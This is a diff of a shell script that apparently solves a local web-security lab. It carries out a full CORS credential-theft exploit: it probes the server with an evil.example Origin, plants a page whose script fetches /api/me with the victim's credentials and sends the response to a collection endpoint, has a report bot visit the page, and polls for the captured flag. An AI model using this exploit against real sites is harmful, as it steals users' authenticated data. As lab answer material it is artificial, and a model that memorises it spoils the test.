@@ -7,12 +7,12 @@ URL="${1:?usage: $0 http://127.0.0.1:9230}"
 new_session lab23
 ID="drop$$"
 
-"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
+open_lab "$SESSION" "$URL/"
 
 # 1. Ask the server what it thinks of each origin. No browser needed for this.
 for O in http://evil.example http://127.0.0.1:9231; do
     printf '%-28s ' "$O" >&2
-    send "$SESSION" req_0 --create --set path=/api/me --set "header.Origin=$O" |
+    send "$SESSION" "$REQ0" --create --set path=/api/me --set "header.Origin=$O" |
         grep -i "access-control-allow-origin" >&2 || echo "(no ACAO)" >&2
 done
 
@@ -24,16 +24,16 @@ fetch('$URL/api/me',{credentials:'include'})
   .then(t=>fetch('$URL/collect?id=$ID&c='+encodeURIComponent(t)))
 </script></body></html>"
 
-send "$SESSION" req_0 --create --set method=POST --set path=/page \
+send "$SESSION" "$REQ0" --create --set method=POST --set path=/page \
     --set header.Content-Type=application/json \
     --set "json.name=steal$$" --set "json.html=$PAGE" >/dev/null
 
-send "$SESSION" req_0 --create --set method=POST --set path=/report \
+send "$SESSION" "$REQ0" --create --set method=POST --set path=/report \
     --set header.Content-Type=application/json \
     --set "json.url=http://127.0.0.1:9231/p/steal$$" >/dev/null
 
 for _ in $(seq 1 30); do
-    OUT="$(send "$SESSION" req_0 --create --set path=/collected --set "query.id=$ID" | body |
+    OUT="$(send "$SESSION" "$REQ0" --create --set path=/collected --set "query.id=$ID" | body |
         python3 -c 'import json,sys,urllib.parse
 print(" ".join(urllib.parse.unquote(r) for r in json.load(sys.stdin)["rows"]))')"
     [ -n "$OUT" ] && { printf '%s\n' "$OUT" | flag; exit 0; }
